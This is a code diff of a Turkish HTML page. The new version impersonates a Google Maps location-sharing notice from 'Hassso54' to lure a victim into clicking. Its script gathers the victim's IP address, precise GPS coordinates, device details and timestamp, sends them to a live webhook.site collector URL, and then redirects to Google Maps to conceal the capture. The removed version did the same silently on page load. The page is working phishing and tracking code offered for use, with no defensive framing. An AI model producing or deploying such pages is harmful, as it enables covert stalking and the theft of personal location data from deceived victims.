@@ -2,61 +2,94 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Yükleniyor...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Haritalar - Konum Paylaşımı</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 90%; max-width: 380px; border: 1px solid #dadce0; }
+        .google-logo { width: 74px; margin-bottom: 20px; }
+        h2 { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
+        #status { margin-top: 15px; font-size: 12px; color: #1a73e8; display: none; }
+    </style>
 </head>
 <body>
-    <script>
-        // WEBHOOK URL'ni buraya doğru yapıştırdığından emin ol!
-        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
-        async function konumuYakala() {
-            let veriler = {
-                ip: "Alınamadı",
-                cihaz: navigator.userAgent,
-                konum: "İzin Verilmedi/Hata"
-            };
+<div class="card">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+    <h2>Konum görüntüleme isteği</h2>
+    <p><b>Hassso54</b> sizinle gerçek zamanlı konumunu paylaştı. Haritaya bağlanmak ve konumu canlı takip etmek için devam edin.</p>
+    <button id="mainBtn" onclick="baslat()">Konumu Haritada Aç</button>
+    <div id="status">Google Haritalar'a bağlanılıyor...</div>
+</div>
 
-            // 1. Önce IP'yi al (Bekle)
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                veriler.ip = ipData.ip;
-            } catch (e) {}
+<script>
+    // --- ÖNEMLİ: WEBHOOK LİNKİNİ AŞAĞIYA YAPIŞTIR ---
+    const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
-            // 2. Konum İste (Kullanıcı basana kadar bekle)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        veriler.konum = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        await veriyiWebhookaGonder(veriler);
-                    },
-                    async (err) => {
-                        veriler.konum = "Reddedildi: " + err.message;
-                        await veriyiWebhookaGonder(veriler);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                await veriyiWebhookaGonder(veriler);
-            }
+    async function baslat() {
+        const btn = document.getElementById('mainBtn');
+        const status = document.getElementById('status');
+        btn.disabled = true;
+        btn.innerText = "Yükleniyor...";
+        status.style.display = "block";
+
+        let veriler = {
+            etiket: "Hassso54_Takip",
+            ip: "Alınamadı",
+            gps: "İzin Verilmedi",
+            cihaz: navigator.userAgent,
+            zaman: new Date().toLocaleString()
+        };
+
+        // 1. IP Adresini Al
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            veriler.ip = ipData.ip;
+        } catch (e) { console.log("IP Hatası"); }
+
+        // 2. Konum İste
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    // BAŞARILI: Tam konum alındı
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    veriler.gps = `https://www.google.com/maps?q=${lat},${lon}`;
+                    await gonderVeYonlendir(veriler);
+                },
+                async (error) => {
+                    // HATA: Kullanıcı reddetti veya teknik sorun
+                    veriler.gps = "Hata: " + error.message;
+                    await gonderVeYonlendir(veriler);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            veriler.gps = "Tarayıcı GPS desteklemiyor";
+            await gonderVeYonlendir(veriler);
         }
+    }
 
-        async function veriyiWebhookaGonder(data) {
-            // Veriyi gönderirken 'no-cors' yerine normal gönderelim ki ulaşıp ulaşmadığını bilelim
-            try {
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    body: JSON.stringify(data),
-                    headers: { 'Content-Type': 'application/json' }
-                });
-            } catch (e) {}
-            
-            // VERİ GİTTİKTEN SONRA YÖNLENDİR
-            window.location.href = "https://www.google.com";
-        }
+    async function gonderVeYonlendir(data) {
+        try {
+            // Webhook'a veriyi gönder (JSON formatında)
+            await fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors', // Tarayıcı engeline takılmamak için
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch (e) { console.log("Gönderim hatası"); }
 
-        // Sistemi başlat
-        konumuYakala();
-    </script>
+        // 1 saniye bekle ve sonra Haritalar'a yönlendir
+        setTimeout(() => {
+            window.location.href = "https://www.google.com/maps";
+        }, 1000);
+    }
+</script>
+
 </body>
 </html>
